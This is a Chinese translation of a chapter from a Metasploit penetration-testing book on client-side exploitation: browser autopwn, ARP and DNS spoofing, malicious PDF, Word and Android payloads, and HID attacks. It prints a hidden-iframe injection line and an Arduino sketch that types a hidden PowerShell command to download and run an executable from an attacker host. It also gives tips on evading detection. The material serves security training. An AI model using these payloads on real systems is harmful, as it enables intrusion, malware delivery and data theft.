# Metasploit 完全指南（四）

> 原文：[`annas-archive.org/md5/7D3B5EAD1083E0AF434036361959F60E`](https://annas-archive.org/md5/7D3B5EAD1083E0AF434036361959F60E)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第十七章：客户端利用

在前几章中，我们涵盖了编码并在许多环境中执行了渗透测试；现在我们准备介绍客户端利用。在本节和接下来的几节中，我们将详细学习客户端利用。

在本章中，我们将重点关注以下内容：

+   攻击目标的浏览器

+   欺骗客户端的复杂攻击向量

+   攻击 Android 并使用 Kali NetHunter

+   使用 Arduino 进行利用

+   将 payload 注入各种文件

客户端利用有时需要受害者与恶意文件进行交互，这使得其成功取决于交互。这些交互可能是访问恶意 URL 或下载并执行文件，这意味着我们需要受害者的帮助才能成功地利用他们的系统。因此，对受害者的依赖是客户端利用的关键因素。

客户端系统可能运行不同的应用程序。PDF 阅读器、文字处理器、媒体播放器和 Web 浏览器是客户端系统的基本软件组件。在本章中，我们将发现这些应用程序中的各种缺陷，这可能导致整个系统被攻破，从而使我们能够利用被攻破的系统作为测试整个内部网络的发射台。

让我们开始利用多种技术攻击客户端，并分析可能导致成功或失败的因素，同时利用客户端漏洞。

# 利用浏览器进行娱乐和盈利

Web 浏览器主要用于浏览网页；然而，过时的 Web 浏览器可能导致整个系统被攻破。客户端可能永远不会使用预安装的 Web 浏览器，而是根据自己的喜好选择一个；然而，默认预安装的 Web 浏览器仍然可能导致对系统的各种攻击。通过发现浏览器组件中的漏洞来利用浏览器被称为**基于浏览器的利用**。

有关 Firefox 漏洞的更多信息，请参阅[`www.cvedetails.com/product/3264/Mozilla-Firefox.html?vendor_id=452`](https://www.cvedetails.com/product/3264/Mozilla-Firefox.html?vendor_id=452)。

参考 Internet Explorer 漏洞[`www.cvedetails.com/product/9900/Microsoft-Internet-Explorer.html?vendor_id=26`](https://www.cvedetails.com/product/9900/Microsoft-Internet-Explorer.html?vendor_id=26)。

# 浏览器 autopwn 攻击

Metasploit 提供了浏览器 autopwn，这是一组旨在通过触发相关漏洞来利用目标浏览器的各种攻击模块。为了了解这个模块的内部工作原理，让我们讨论一下攻击背后的技术。

# 浏览器 autopwn 攻击背后的技术

autopwn 指的是对目标的自动利用。autopwn 模块通过自动配置它们一个接一个地将大多数基于浏览器的利用程序设置为监听模式。在特定浏览器发来的请求时，它会启动一组匹配的利用程序。因此，无论受害者使用的是哪种浏览器，如果浏览器中存在漏洞，autopwn 脚本都会自动使用匹配的利用程序模块对其进行攻击。

让我们通过以下图表详细了解这种攻击向量的工作原理：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/af0e3d45-40f4-46b8-8943-71d8f3a0fe42.png)

在前面的场景中，一个利用服务器基地正在运行，并配置了一些基于浏览器的利用程序及其匹配的处理程序。一旦受害者的浏览器连接到利用服务器，利用服务器基地会检查浏览器的类型，并将其与匹配的利用程序进行测试。在前面的图表中，我们有 Internet Explorer 作为受害者的浏览器。因此，与 Internet Explorer 匹配的利用程序将被发送到受害者的浏览器。随后的利用程序将与处理程序建立连接，攻击者将获得对目标的 shell 或 meterpreter 访问权限。

# 使用 Metasploit 浏览器 autopwn 攻击浏览器

为了进行浏览器利用攻击，我们将使用 Metasploit 中的`browser_autopwn`模块，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/1898ad2e-6e22-423e-bf5e-92f8a0aa073b.png)

我们可以看到，我们成功在 Metasploit 中加载了位于`auxiliary/server/browser_autpown2`的`browser_autopwn`模块。要发动攻击，我们需要指定`LHOST`、`URIPATH`和`SRVPORT`。`SRVPORT`是我们的利用服务器基础运行的端口。建议使用端口`80`或`443`，因为在`URL`中添加端口号会引起许多人的注意，看起来可疑。`URIPATH`是各种利用的目录路径，并且应通过将`URIPATH`指定为`/`来保持在根目录中。让我们设置所有必需的参数并启动模块，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/e91a437a-0af0-43ef-80a6-bfccc81dfb6e.png)

启动`browser_autopwn`模块将设置浏览器利用处于监听模式，等待传入连接，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/bab6c08e-2dc6-491a-8e26-bd9229dd9db5.png)

任何连接到我们系统端口`80`的目标都将根据其浏览器获得一系列的利用。让我们分析一下受害者如何连接到我们的恶意利用服务器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/dc8b15eb-e65d-4635-9714-493896c05c78.png)

我们可以看到，一旦受害者连接到我们的 IP 地址，`browser_autopwn`模块会以各种利用方式做出响应，直到获得 Meterpreter 访问，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b0594259-ab91-4c3c-8095-61af4f4342f4.png)

正如我们所看到的，`browser_autopwn`模块允许我们测试和积极利用受害者浏览器的多个漏洞；然而，客户端利用可能会导致服务中断。在进行客户端利用测试之前，最好获得事先许可。在接下来的部分中，我们将看到像`browser_autopwn`这样的模块如何对多个目标造成致命打击。

# 危害网站客户端

在本节中，我们将尝试开发方法，通过这些方法可以将常见攻击转化为致命的选择武器。

如前一节所示，向目标发送 IP 地址可能会引起注意，受害者可能会后悔浏览您发送的 IP 地址；然而，如果向受害者发送的是域名地址而不是裸 IP 地址，则逃避受害者的注意的可能性更大，结果是有保证的。

# 注入恶意 Web 脚本

一个有漏洞的网站可以作为浏览器 autopwn 服务器的发射台。攻击者可以将隐藏的 iFrame 嵌入到有漏洞服务器的网页中，这样任何访问服务器的人都将面对浏览器 autopwn 攻击。因此，每当有人访问被注入的页面时，浏览器 autopwn 利用服务器都会测试他们的浏览器是否存在漏洞，并且在大多数情况下也会利用它。

使用**iFrame 注入**可以实现对网站用户的大规模黑客攻击。让我们在下一节中了解攻击的解剖。

# 黑客攻击网站用户

让我们通过以下图表了解如何使用浏览器利用来黑客攻击网站用户：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d47c58f9-d31a-467b-b2e0-d36c724afc31.png)

前面的图表非常清晰。现在让我们找出如何做到这一点。但请记住，这种攻击最重要的要求是访问具有适当权限的有漏洞服务器。让我们通过以下截图更多地了解如何注入恶意脚本：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/69db68ca-2c5b-42cb-bf8a-a419149329af.png)

我们有一个示例网站，存在一个允许我们上传基于 PHP 的第三方 Web shell 的 Web 应用程序漏洞。要执行攻击，我们需要将以下行添加到`index.php`页面，或者我们选择的任何其他页面：

```
<iframe src="img/" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe> 
```

上述代码行将在受害者访问网站时在 iFrame 中加载恶意的浏览器 autopwn。由于这段代码在一个`iframe`标签中，它将自动从攻击者的系统中包含浏览器 autopwn。我们需要保存这个文件并允许访问者查看网站并浏览它。

一旦受害者浏览到被感染的网站，浏览器 autopwn 将自动在他们的浏览器上运行；但是，请确保`browser_autopwn`模块正在运行。如果没有，您可以使用以下命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d0a36848-5ab7-4e7c-a6a8-1685ca963f2d.png)

如果一切顺利，我们将能够在目标系统上运行 Meterpreter。整个想法是利用目标网站来诱使尽可能多的受害者，并获取对其系统的访问权限。这种方法在进行白盒测试时非常方便，其中内部 Web 服务器的用户是目标。让我们看看当受害者浏览到恶意网站时会发生什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/871b6a25-7d7c-4dcf-accb-858c3528ace9.png)

我们可以看到对 IP `192.168.10.107`发起了调用，这是我们的浏览器 autopwn 服务器。让我们从攻击者的角度来看一下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/470284b3-7f5d-4d16-9853-8ab12baa9562.png)

我们可以看到利用正在轻松进行。成功利用后，我们将获得 Meterpreter 访问，就像前面的例子中演示的那样。

# 带有 DNS 欺骗和 MITM 攻击的 autopwn

对受害者系统进行所有攻击的主要动机是以最小的检测和最低的被发现风险获得访问权限。

现在，我们已经看到了传统的浏览器 autopwn 攻击以及修改以侵入网站目标受众的方式。但是，我们仍然有以某种方式将链接发送给受害者的限制。

然而，在这种攻击中，我们将以不同的方式对受害者进行相同的浏览器 autopwn 攻击。在这种情况下，我们不会向受害者发送任何链接。相反，我们将等待他们浏览他们喜欢的网站。

这种攻击只能在局域网环境中工作。这是因为要执行这种攻击，我们需要进行 ARP 欺骗，它在第 2 层上工作，并且只在相同的广播域下工作；然而，如果我们可以以某种方式修改远程受害者的`hosts`文件，我们也可以在广域网上执行这种攻击，这被称为**Pharming 攻击**。

# 用 DNS 劫持欺骗受害者

让我们开始吧。在这里，我们将对受害者进行 ARP 毒化攻击，并欺骗 DNS 查询。因此，如果受害者尝试打开一个标准网站，比如[`google.com`](http://google.com)，这是最常浏览的网站，他们将得到浏览器 autopwn 服务作为回报，这将导致他们的系统受到浏览器 autopwn 服务器的攻击。

我们首先将创建一个用于毒化 DNS 的条目列表，这样每当受害者尝试打开一个域时，域的名称将指向我们的浏览器 autopwn 服务的 IP 地址，而不是[`www.google.com`](http://www.google.com)。DNS 的欺骗条目存储在以下文件中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ac92e6ad-e001-436e-94f3-5cddee1b7d79.png)

在这个例子中，我们将使用最流行的 ARP 毒化工具集之一，`ettercap`。首先，我们将搜索文件并在其中创建一个虚假的 DNS 条目。这很重要，因为当受害者尝试打开网站时，他们将得到我们自定义的 IP 地址，而不是原始 IP。为了做到这一点，我们需要修改`etter.dns`文件中的条目，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/1f3fe98c-81c5-4768-bf75-35390c3901d6.png)

我们需要在这一部分做以下更改：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/38c5267b-3a0e-4116-b08b-375adb388762.png)

这个条目将在受害者请求[`google.com`](http://google.com)时发送攻击者机器的 IP 地址。创建条目后，保存该文件并打开`ettercap`，使用下面截图中显示的命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/280ce278-5fe7-4895-b530-aeb727208753.png)

上述命令将以图形模式启动 Ettercap，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/fcba4a43-ca9f-48bf-9cd7-9168eaf3949f.png)

我们需要从“嗅探”选项卡中选择“统一嗅探…”选项，并选择默认接口，即 eth0，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/eaebae02-2630-4ab9-8a74-46bbe5743ad9.png)

下一步是扫描网络范围，以识别网络上存在的所有主机，包括受害者和路由器，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/7c1b8166-b56a-4b7a-a1db-c1b067b8e300.png)

根据地址范围，所有扫描的主机都根据其存在进行过滤，并将网络上所有现有的主机添加到主机列表中，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/bbabecee-d538-4515-88de-29f649a5fbc9.png)

要打开主机列表，我们需要导航到“主机”选项卡并选择“主机列表”，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b64c9bc6-87dd-47df-84b0-760efffb7003.png)

下一步是将路由器地址添加到**目标 2**，将受害者添加到**目标 1**。我们将路由器用作**目标 2**，将受害者用作**目标 1**，因为我们需要拦截来自受害者并发送到路由器的信息。

下一步是浏览到 Mitm 选项卡并选择 ARP 毒化，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ba297a6b-0c36-4488-9df6-0720dfbd8ffc.png)

接下来，点击“确定”并继续下一步，即浏览到“开始”选项卡并选择“开始嗅探”。点击“开始嗅探”选项将通知我们一个消息，显示“开始统一嗅探…”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c114c818-adfe-4b05-8bc2-e1a4f53a30f1.png)

下一步是从“插件”选项卡中激活 DNS 欺骗插件，选择“管理插件”，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2a1de148-5074-420b-bf44-e7b8e73b31c8.png)

双击 DNS 欺骗插件以激活 DNS 欺骗。激活此插件后会发生的情况是，它将开始从我们之前修改的`etter.dns`文件中发送虚假的 DNS 条目。因此，每当受害者请求特定网站时，来自`etter.dns`文件的欺骗性 DNS 条目将返回，而不是网站的原始 IP。这个虚假的条目是我们浏览器 autopwn 服务的 IP 地址。因此，受害者不会进入原始网站，而是被重定向到浏览器 autopwn 服务，从而使他们的浏览器被攻破：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/8934ff24-fe87-4ac6-a09a-502c28151de8.png)

让我们还在端口`80`上启动我们的恶意`browser_autopwn`服务：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/1d65b390-e000-4596-b44d-ce92de05b118.png)

现在，让我们看看当受害者尝试打开[`google.com/`](http://google.com/)时会发生什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/923abff6-f76b-4fe2-b0e2-5a78860e8ac8.png)

让我们也看看攻击者端是否有什么有趣的东西，或者没有：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/52c01a0b-36e2-42a0-9603-4b6ebc8f9648.png)

太棒了！我们在后台打开了 Meterpreter，这表明我们的攻击已经成功，而不需要向受害者发送任何链接。这种攻击的优势在于我们从未向受害者发布任何链接，因为我们在本地网络上毒害了 DNS 条目；然而，要在 WAN 网络上执行这种攻击，我们需要修改受害者的主机文件，这样每当对特定 URL 的请求被发出时，主机文件中的受感染条目将把它重定向到我们的恶意 autopwn 服务器，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/95c5e863-7d54-4cc0-bd80-45bd7041b3c3.png)

因此，许多其他技术可以使用 Metasploit 中支持的各种攻击重新发明。

# 使用 Kali NetHunter 进行浏览器漏洞利用

我们看到了如何欺骗 DNS 查询并在同一网络上利用它对目标进行攻击。我们也可以使用 NetHunter Android 设备执行类似但无麻烦的攻击。为了避开受害者的眼睛，我们不会像在之前的演示中那样使用特定的网站，比如 Google。在这种攻击类型中，我们将使用 Kali NetHunter 中的**cSploit**工具通过脚本注入攻击注入目标正在浏览的所有网站。因此，让我们通过 cSploit 进行浏览：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a219f45f-6784-487c-82e1-7eb195fb3e0b.png)

我们假设我们的目标是`DESKTOP-PESQ21S`，点击它将打开一个包含所有列出选项的子菜单：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/28e22458-77d1-44d4-b0d3-a592c98d11fc.png)

让我们选择 MITM，然后是脚本注入和自定义代码，结果将是以下屏幕：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b91ce379-7a05-41a9-9f34-965a27679df8.png)

我们将使用自定义脚本攻击和默认脚本来开始。现在，这将会将此脚本注入到目标正在浏览的所有网页中。让我们按“确定”来启动攻击。一旦目标打开新网站，受害者将看到以下内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/71587fdc-23ca-4556-92d0-1e7e77b4d3cc.png)

我们可以看到我们的攻击完美地成功了。我们现在可以创建一些 JavaScript，用于加载浏览器的 autopwn 服务。我故意留下 JavaScript 练习给你完成，这样在创建脚本时，你可以研究更多技术，比如基于 JavaScript 的 cookie 记录器；然而，运行 JavaScript 后，将在后台加载浏览器的 autopwn 服务，我们将得到以下输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/93235454-fb60-409a-bedd-96f0d8188d91.png)

太神奇了，对吧？ NetHunter 和 cSploit 是改变游戏规则的。然而，如果你不知何故无法创建 JavaScript，你可以使用重定向选项来重定向目标，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/1a27093b-9793-4e0a-a676-661c7cdc5b15.png)

单击“确定”按钮将强制所有流量转到端口`8080`上的前一个地址，这只是我们的 autopwn 服务器的地址。

# Metasploit 和 Arduino - 致命的组合

基于 Arduino 的微控制器板是微小而不寻常的硬件，当涉及到渗透测试时，它们可以充当致命武器。一些 Arduino 板支持键盘和鼠标库，这意味着它们可以作为 HID 设备：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/805955d7-654d-41b1-a4c5-153611bc715b.jpg)

因此，这些小型 Arduino 板可以偷偷地执行诸如键盘输入、鼠标移动和点击等人类动作，以及许多其他操作。在本节中，我们将模拟 Arduino Pro Micro 板作为键盘，从远程站点下载并执行我们的恶意载荷；然而，这些小板没有足够的内存来保存载荷，因此需要下载。

有关使用 HID 设备进行利用的更多信息，请参阅 USB Rubber Ducky 或 Teensy。

**Arduino Pro Micro**在诸如[`www.aliexpress.com/`](https://www.aliexpress.com/)等知名购物网站上的价格不到 4 美元。因此，使用 Arduino Pro Micro 比 Teensy 和 USB Rubber Ducky 要便宜得多。

使用其编译器软件配置 Arduino 非常容易。精通编程概念的读者会发现这个练习非常容易。

有关设置和开始使用 Arduino 的更多信息，请参阅[`www.arduino.cc/en/Guide/Windows`](https://www.arduino.cc/en/Guide/Windows)。

让我们看看我们需要在 Arduino 芯片上烧录的代码：

```
#include<Keyboard.h>
void setup() {
delay(2000);
type(KEY_LEFT_GUI,false);
type('d',false);
Keyboard.releaseAll();
delay(500);
type(KEY_LEFT_GUI,false);
type('r',false);
delay(500);
Keyboard.releaseAll();
delay(1000);
print(F("powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('http://192.168.10.107/pay2.exe','%TEMP%\\mal.exe'); Start-Process \"%TEMP%\\mal.exe\""));
delay(1000);
type(KEY_RETURN,false);
Keyboard.releaseAll();
Keyboard.end();
}
void type(int key, boolean release) {
 Keyboard.press(key);
 if(release)
  Keyboard.release(key);
}
void print(const __FlashStringHelper *value) {
 Keyboard.print(value);
}
void loop(){}
```

我们有一个名为`type`的函数，它接受两个参数，即要按下和释放的键的名称，这决定了我们是否需要释放特定的键。下一个函数是`print`，它通过直接在键盘按下函数上输出文本来覆盖默认的`print`函数。Arduino 主要有两个函数，即`loop`和`setup`。由于我们只需要我们的 payload 下载和执行一次，所以我们将代码放在`setup`函数中。当我们需要重复一组指令时，需要`Loop`函数。`delay`函数相当于`sleep`函数，它暂停程序一定的毫秒数。`type(KEY_LEFT_GUI, false);`将按下目标上的左 Windows 键，由于我们需要保持按下，所以我们将`false`作为释放参数传递。接下来，以同样的方式，我们传递`d`键。现在，我们按下了两个键，即 Windows + *D*（显示桌面的快捷键）。一旦我们提供`Keyboard.releaseAll();`，`Windows+d`命令就会被推送到目标上执行，这将最小化桌面上的所有内容。

在[`www.arduino.cc/en/Reference/KeyboardModifiers`](https://www.arduino.cc/en/Reference/KeyboardModifiers)了解更多关于 Arduino 键盘库的信息。

同样，我们提供下一个组合来显示运行对话框。接下来，我们在运行对话框中打印 PowerShell 命令，该命令将从远程站点`192.168.10.107/pay2.exe`下载我们的 payload 到`Temp`目录，并将其从那里执行。提供命令后，我们需要按*Enter*来运行命令。我们可以通过将`KEY_RETURN`作为键值来实现这一点。让我们看看如何向 Arduino 板写入：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/60db5ac4-e456-44a9-be61-089f6f46890f.png)

我们可以看到我们需要通过浏览 Tools 菜单来选择我们的板类型，如前面的截图所示。接下来，我们需要为板选择通信端口：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/48473637-2cad-4666-a1bd-e0317a13d2e6.png)

接下来，我们需要通过按->图标将程序写入板：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/0b48c16d-a8e2-4b7a-991c-88cebff09851.png)

我们的 Arduino 现在已经准备好插入受害者的系统。好消息是它模拟键盘。因此，您不必担心被检测到；但是，payload 需要被混淆得足够好，以避开杀毒软件的检测。

像这样插入设备：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/5e5af455-79e3-4533-af20-750fcbbf1590.jpg)

一旦我们插入设备，几毫秒内，我们的 payload 就会被下载，在目标系统上执行，并为我们提供以下信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/3a9f2dae-4f3e-49d8-8cf4-57e79493cbfb.png)

让我们来看看我们如何生成 payload：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/e3acb414-54c6-428e-84ee-ecc40da7ce96.png)

我们可以看到我们为 Windows 创建了一个简单的 x64 Meterpreter payload，它将连接到端口`5555`。我们将可执行文件直接保存到 Apache 文件夹，并按照前面的截图启动了 Apache。接下来，我们只是启动了一个利用处理程序，它将监听端口`5555`上的传入连接，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/9047da23-c2d0-4452-ac55-63c27bf4cfa2.png)

我们在这里看到了一个非常新的攻击。使用廉价的微控制器，我们能够访问 Windows 10 系统。Arduino 很有趣，我建议进一步阅读有关 Arduino、USB Rubber Ducky、Teensy 和 Kali NetHunter 的信息。Kali NetHunter 可以使用任何 Android 手机模拟相同的攻击。

有关 Teensy 的更多信息，请访问[`www.pjrc.com/teensy/`](https://www.pjrc.com/teensy/)。

有关 USB Rubber Ducky 的更多信息，请访问[`hakshop.myshopify.com/products/usb-rubber-ducky-deluxe`](http://hakshop.myshopify.com/products/usb-rubber-ducky-deluxe)。

# 基于文件格式的利用

在本节中，我们将涵盖使用恶意文件对受害者进行各种攻击。每当这些恶意文件运行时，Meterpreter 或 shell 访问将提供给目标系统。在下一节中，我们将介绍使用恶意文档和 PDF 文件进行利用。

# 基于 PDF 的漏洞利用

基于 PDF 文件格式的利用是触发各种 PDF 阅读器和解析器中的漏洞，这些漏洞被设计为执行携带 PDF 文件的有效负载，向攻击者提供对目标系统的完全访问，以 Meterpreter shell 或命令 shell 的形式；然而，在进入技术之前，让我们看看我们正在针对什么漏洞，以及环境细节是什么：

| **测试案例** | **描述** |
| --- | --- |
| 漏洞 | 该模块利用了 Nitro 和 Nitro Pro PDF Reader 版本 11 中实现的不安全的 JavaScript API。`saveAs()` Javascript API 函数允许将任意文件写入文件系统。此外，`launchURL()`函数允许攻击者执行文件系统上的本地文件，并绕过安全对话框。 |
| 在操作系统上利用 | Windows 10 |
| 软件版本 | Nitro Pro 11.0.3.173 |
| CVE 细节 | [`www.cvedetails.com/cve/CVE-2017-7442/`](https://www.cvedetails.com/cve/CVE-2017-7442/) |
| 利用细节 | `exploit/windows/fileformat/nitro_reader_jsapi` |

为了利用这个漏洞，我们将创建一个 PDF 文件并发送给受害者。当受害者尝试打开我们的恶意 PDF 文件时，我们将能够获得 Meterpreter shell 或基于使用的有效负载的命令 shell。让我们进一步，尝试构建恶意的 PDF 文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/f3020904-f84d-48b1-b77f-8769dde6541a.png)

我们需要将`LHOST`设置为我们的 IP 地址，并选择`LPORT`和`SRVPORT`。出于演示目的，我们将选择将端口设置为默认的`8080`，`LPORT`设置为`4444`。让我们按照以下方式运行模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/505520d9-05a4-409e-aaad-d4c2ffde20ac.png)

我们需要通过多种方式之一向受害者发送`msf.pdf`文件，例如上传文件并将链接发送给受害者，将文件放入 USB 存储设备中，或者通过电子邮件发送压缩的 ZIP 文件格式；然而，出于演示目的，我们已经将文件托管在我们的 Apache 服务器上。一旦受害者下载并执行文件，他们将看到类似于以下屏幕的内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/1deb1462-865f-4d77-98af-ae64aa9b6c63.png)

在一小部分时间内，覆盖的窗口将消失，并将导致成功的 Meterpreter shell，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/5ea1162a-a9e8-4015-a241-b6386f513749.png)

# 基于 Word 的漏洞利用

基于 Word 的漏洞利用侧重于我们可以加载到 Microsoft Word 中的各种文件格式；然而，一些文件格式执行恶意代码，并可以让攻击者访问目标系统。我们可以像对待 PDF 文件一样利用基于 Word 的漏洞。让我们快速看一些与这个漏洞相关的基本事实：

| **测试案例** | **描述** |
| --- | --- |
| 漏洞 | 该模块创建一个恶意的 RTF 文件，当在易受攻击的 Microsoft Word 版本中打开时，将导致代码执行。缺陷存在于**olelink**对象如何发出 HTTP(s)请求并执行 HTA 代码的方式。 |
| 在操作系统上利用 | Windows 7 32 位 |
| 我们环境中的软件版本 | Microsoft Word 2013 |
| CVE 细节 | [`www.cvedetails.com/cve/cve-2017-0199`](https://www.cvedetails.com/cve/cve-2017-0199) |
| 利用细节 | `exploit/windows/fileformat/office_word_hta` |

让我们尝试利用这个漏洞来访问易受攻击的系统。因此，让我们快速启动 Metasploit 并创建文件，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/4c8845b2-71db-4f51-9e19-10f9d2e3e99d.png)

让我们将`FILENAME`和`SRVHOST`参数分别设置为`Report.doc`和我们的 IP 地址，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/0698f567-a9c4-454b-a423-7f54b66e54ac.png)

生成的文件存储在`/root/.msf4/local/Report.doc`路径下。让我们将这个文件移动到我们的 Apache `htdocs`目录：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ce9289e2-89a4-4269-aa05-c9628e20aa43.png)

我们需要通过多种方式之一将`Report.doc`文件发送给受害者，例如上传文件并将链接发送给受害者，将文件放入 USB 存储设备，或者通过电子邮件以压缩的 ZIP 文件格式发送；但是，出于演示目的，我们已经将文件托管在我们的 Apache 服务器上。让我们在受害者机器上下载它，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/62a25f69-a9c3-4d83-872a-7d6967238dce.png)

让我们打开这个文件，看看是否发生了什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/cfa24d6a-0d90-4b1f-b4b4-21b4cc699ab0.png)

我们可以看到这里没有发生太多事情。让我们回到我们的 Metasploit 控制台，看看我们得到了什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/3a219fea-6305-4fa8-9b08-92bd2fd18f04.png)

哇哇！我们轻松地获得了对目标的 Meterpreter 访问权限。我们刚刚看到了创建恶意 Word 文档并访问目标机器有多么容易。但等等！是这么容易吗？不，我们还没有考虑目标系统的安全性！在现实世界的场景中，我们有很多在目标机器上运行的防病毒解决方案和防火墙，这最终会破坏我们的计划。我们将在下一章中解决这些防御措施。

# 使用 Metasploit 攻击 Android

Android 平台可以通过创建简单的 APK 文件或将有效负载注入现有 APK 来进行攻击。我们将介绍第一种方法。让我们开始使用`msfvenom`生成一个 APK 文件，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a6c135fd-7c18-4d05-aede-dcaec72610bb.png)

生成 APK 文件后，我们只需要说服受害者（进行社会工程）安装 APK，或者物理上获取手机的访问权限。让我们看看受害者下载恶意 APK 后手机上会发生什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/7eaa041d-4e0e-4115-9ccb-c9f6a7910c4e.png)

下载完成后，用户按照以下步骤安装文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d9ebb820-b4b5-4318-b360-500c999f7004.png)

大多数人在智能手机上安装新应用程序时都不会注意应用程序请求的权限。因此，攻击者可以完全访问手机并窃取个人数据。上述屏幕截图列出了应用程序需要正确运行的所需权限。一旦安装成功，攻击者就可以完全访问目标手机：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/46575e06-9f78-4eac-a0e0-bd57c55b21e2.png)

哇！我们轻松获得了 Meterpreter 访问权限。后期利用在下一章中广泛涵盖；但是，让我们看一些基本功能：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/39e3fc1b-9ac2-41db-936b-b780e749d90f.png)

我们可以看到运行`check_root`命令时显示设备已被 root。让我们看一些其他功能：

